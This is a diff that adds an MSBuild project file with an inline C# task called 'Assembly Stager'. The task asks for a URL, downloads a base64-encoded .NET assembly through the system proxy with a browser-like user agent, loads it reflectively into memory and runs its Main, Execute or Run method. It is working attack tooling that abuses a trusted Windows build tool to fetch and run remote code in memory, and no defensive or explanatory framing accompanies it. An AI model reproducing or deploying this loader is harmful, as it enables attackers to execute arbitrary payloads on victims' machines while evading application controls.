@@ -1,0 +1,173 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Stager">
+    <AssemblyStager/>
+  </Target>
+  
+  <UsingTask TaskName="AssemblyStager" TaskFactory="CodeTaskFactory" 
+             AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using System.Net;
+        using System.Reflection;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        
+        public class AssemblyStager : Task
+        {
+            public override bool Execute()
+            {
+                Console.WriteLine("========================================");
+                Console.WriteLine("    Assembly Stager");
+                Console.WriteLine("========================================");
+                Console.WriteLine();
+                
+                Console.Write("Enter URL: ");
+                string url = Console.ReadLine();
+                
+                if (string.IsNullOrWhiteSpace(url))
+                {
+                    Console.WriteLine("[-] No URL provided");
+                    return false;
+                }
+                
+                try
+                {
+                    Console.WriteLine("[*] Fetching from: " + url);
+                    byte[] assemblyBytes = FetchAssembly(url);
+                    
+                    Console.WriteLine("[*] Assembly size: " + assemblyBytes.Length + " bytes");
+                    Console.WriteLine("[*] Loading into memory...");
+                    
+                    Assembly assembly = Assembly.Load(assemblyBytes);
+                    
+                    Console.WriteLine("[+] Assembly loaded: " + assembly.FullName);
+                    Console.WriteLine("[*] Executing...");
+                    Console.WriteLine();
+                    
+                    ExecuteAssembly(assembly);
+                    
+                    Console.WriteLine();
+                    Console.WriteLine("[+] Execution complete");
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[-] Error: " + ex.Message);
+                    Console.WriteLine(ex.StackTrace);
+                    return false;
+                }
+                
+                return true;
+            }
+            
+            private byte[] FetchAssembly(string url)
+            {
+                WebClient wc = new WebClient();
+                
+                // Use system proxy settings
+                wc.Proxy = WebRequest.GetSystemWebProxy();
+                wc.Proxy.Credentials = CredentialCache.DefaultCredentials;
+                
+                // Set a realistic user agent
+                wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+                
+                try
+                {
+                    Console.WriteLine("[*] Downloading base64 encoded assembly...");
+                    string base64String = wc.DownloadString(url);
+                    
+                    // Clean up whitespace/newlines
+                    base64String = base64String.Trim();
+                    base64String = base64String.Replace("\n", "");
+                    base64String = base64String.Replace("\r", "");
+                    base64String = base64String.Replace(" ", "");
+                    
+                    Console.WriteLine("[*] Decoding base64 (" + base64String.Length + " chars)...");
+                    return Convert.FromBase64String(base64String);
+                }
+                catch (WebException ex)
+                {
+                    throw new Exception("Failed to download: " + ex.Message);
+                }
+                catch (FormatException ex)
+                {
+                    throw new Exception("Invalid base64 format: " + ex.Message);
+                }
+            }
+            
+            private void ExecuteAssembly(Assembly assembly)
+            {
+                // Try to find and execute entry point
+                
+                // Method 1: Look for a class with Main() method
+                foreach (Type type in assembly.GetTypes())
+                {
+                    MethodInfo mainMethod = type.GetMethod("Main", 
+                        BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
+                    
+                    if (mainMethod != null)
+                    {
+                        Console.WriteLine("[*] Found Main() in: " + type.FullName);
+                        
+                        // Invoke Main
+                        ParameterInfo[] parameters = mainMethod.GetParameters();
+                        if (parameters.Length == 0)
+                        {
+                            mainMethod.Invoke(null, null);
+                        }
+                        else if (parameters.Length == 1 && parameters[0].ParameterType == typeof(string[]))
+                        {
+                            mainMethod.Invoke(null, new object[] { new string[0] });
+                        }
+                        
+                        return;
+                    }
+                }
+                
+                // Method 2: Look for Execute() method in any class
+                foreach (Type type in assembly.GetTypes())
+                {
+                    MethodInfo execMethod = type.GetMethod("Execute", 
+                        BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
+                    
+                    if (execMethod != null)
+                    {
+                        Console.WriteLine("[*] Found Execute() in: " + type.FullName);
+                        
+                        if (execMethod.GetParameters().Length == 0)
+                        {
+                            execMethod.Invoke(null, null);
+                            return;
+                        }
+                    }
+                }
+                
+                // Method 3: Try to instantiate and call Run()
+                foreach (Type type in assembly.GetTypes())
+                {
+                    MethodInfo runMethod = type.GetMethod("Run", 
+                        BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
+                    
+                    if (runMethod != null)
+                    {
+                        Console.WriteLine("[*] Found Run() in: " + type.FullName);
+                        
+                        object instance = Activator.CreateInstance(type);
+                        
+                        if (runMethod.GetParameters().Length == 0)
+                        {
+                            runMethod.Invoke(instance, null);
+                            return;
+                        }
+                    }
+                }
+                
+                throw new Exception("No suitable entry point found (Main, Execute, or Run)");
+            }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
